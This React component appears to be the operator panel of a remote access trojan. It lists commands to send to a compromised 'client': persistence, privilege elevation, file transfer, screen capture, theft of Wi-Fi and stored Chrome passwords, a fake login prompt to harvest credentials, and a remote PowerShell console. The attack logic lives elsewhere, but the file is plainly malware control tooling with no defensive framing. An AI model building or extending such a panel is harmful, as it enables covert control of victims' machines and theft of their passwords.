import {Button, Form} from "react-bootstrap";
import {NavLink} from "react-router-dom";
import React, {useEffect, useState} from "react";
import {sendCommand} from "../../api/api";

function ClientActions(props) {
    const [fileName, setFileName] = useState(null);
    const [command, setCommand] = useState(null);

    async function SendCommand()
    {
        //need a global state of the client is connected? and only then allow sending the command
        //if(clientIsConnected)...
        if(command === 'startPS') {
            //disable all other buttons and command select
        }
        else{
            if(!await sendCommand(props.client.client_id, command)) {
                //handle errors from server
            }
        }



    }
    return <>
        <Form.Group controlId="command">
            <Form.Label className={"small-titles"} id={"title2"}>Command</Form.Label>
            <Form.Control as="select" value={command} onChange={e => {
                setCommand(e.target.value);
            }}>
                <option value={"stayhome"}>Persistence</option>
                <option value={"elevate"}>Elevate</option>
                <option value={"upload"}>Upload</option>
                <option value={"download"}>Download</option>
                <option value={"change-image"}>Change background</option>
                <option value={"capture"}>Screen capture</option>
                <option value={"get-network"}>Get network information</option>
                <option value={"getwifi"}>Get wifi passwords</option>
                <option value={"webPass"}>Get stored chrome passwords</option>
                <option value={"PromptUser"}>Prompt user for login UI</option>
                <option value={"StartPS"}>Start powershell console</option>

            </Form.Control>
            <Form.File className={"small-titles"} id="upload-file" label="Choose file" onChange={(e) => setFileName(e.target.files[0].name)}/>
        </Form.Group>
        <Form.Group controlId="sendCommand">
            <Button class="buttons" id={"send-button"} variant={"success"} onClick={SendCommand}>Send</Button>
        </Form.Group>
        {/*<Form.Group controlId="response">*/}
        {/*    <Form.Label className={"small-titles"} id={"title3"}>Response</Form.Label>*/}
        {/*    <Form.Control as="textarea" rows={10} disabled={true} className={"response"}/>*/}
        {/*</Form.Group>*/}
        {/*<div className={"buttons"}>*/}
        {/*    <NavLink to={"/clients"}>*/}
        {/*        <Button href="/clients" variant={"success"}>Back</Button>*/}
        {/*    </NavLink>*/}
        {/*</div>*/}

    </>;
}

export default ClientActions;